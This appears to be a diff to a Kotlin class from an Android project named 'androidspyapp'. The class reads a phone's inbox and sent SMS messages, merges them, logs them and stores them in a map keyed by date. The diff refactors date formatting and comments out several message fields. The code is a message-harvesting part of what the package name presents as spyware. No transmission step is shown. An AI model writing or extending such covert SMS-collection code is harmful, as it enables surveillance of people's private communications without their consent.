@@ -5,7 +5,6 @@ import android.content.Context
 import android.net.Uri
 import android.util.Log
 import com.komnacki.androidspyapp.Message
-import java.text.SimpleDateFormat
 
 class SmsState(override var context: Context) :
     Message {
@@ -29,13 +28,13 @@ class SmsState(override var context: Context) :
             val sentSmses: MutableList<MessagePOJO> = getMessages(MessageType.SENT) as MutableList<MessagePOJO>
 
             inboxSmses.addAll(sentSmses)
-            inboxSmses.sortBy { m -> m.dateSend }
+//            inboxSmses.sortBy { m -> m.dateSend }
 
             Log.d("KK: ", "sms list lenght: " + inboxSmses.size)
 
             inboxSmses.forEach { m ->
-                Log.d("KK: ", "getSms: sms tag: " + SimpleDateFormat("yyyy-MM-dd_HH:mm:ss").format(m.date))
-                info.put(SimpleDateFormat("yyyy-MM-dd_HH:mm:ss").format(m.date), m)
+                Log.d("KK: ", "getSms: sms tag: " + m.date)
+                info.put(m.date!!, m)
             }
         }
 
@@ -59,14 +58,21 @@ class SmsState(override var context: Context) :
                                 if (cursorInbox.isNull(1)) - 1 else cursorInbox.getLong(1),
                                 if (cursorInbox.isNull(2)) "Brak danych" else cursorInbox.getString(2),
                                 if (cursorInbox.isNull(3)) "Brak danych" else cursorInbox.getString(3),
-                                if (cursorInbox.isNull(4)) - 1 else cursorInbox.getLong(4),
-                                if (cursorInbox.isNull(5)) - 1 else cursorInbox.getLong(5),
-                                if (cursorInbox.isNull(6)) - 1 else cursorInbox.getLong(6),
-                                if (cursorInbox.isNull(7)) "Brak danych" else cursorInbox.getString(7),
-                                if (cursorInbox.isNull(8)) "Brak danych" else cursorInbox.getString(8),
-                                if (cursorInbox.isNull(9)) "Brak danych" else cursorInbox.getString(9),
-                                if (cursorInbox.isNull(11)) "Brak danych" else cursorInbox.getString(11),
-                                if (cursorInbox.isNull(12)) "Brak danych" else cursorInbox.getString(12)
+                                if (cursorInbox.isNull(4)) - 1 else cursorInbox.getLong(4)
+//                                if (cursorInbox.isNull(5)) - 1 else cursorInbox.getLong(5),
+//                                if (cursorInbox.isNull(6)) - 1 else cursorInbox.getLong(6),
+//                                if (cursorInbox.isNull(7)) "Brak danych" else cursorInbox.getString(7),
+//                                if (cursorInbox.isNull(8)) "Brak danych" else cursorInbox.getString(8),
+//                                if (cursorInbox.isNull(9)) "Brak danych" else cursorInbox.getString(9),
+//                                if (cursorInbox.isNull(11)) "Brak danych" else cursorInbox.getString(11),
+//                                if (cursorInbox.isNull(12)) "Brak danych" else cursorInbox.getString(12)
+//                            -1,
+//                            -1,
+//                            "null",
+//                            "null",
+//                            "null",
+//                            "null",
+//                            "null"
                             )
                         )
 
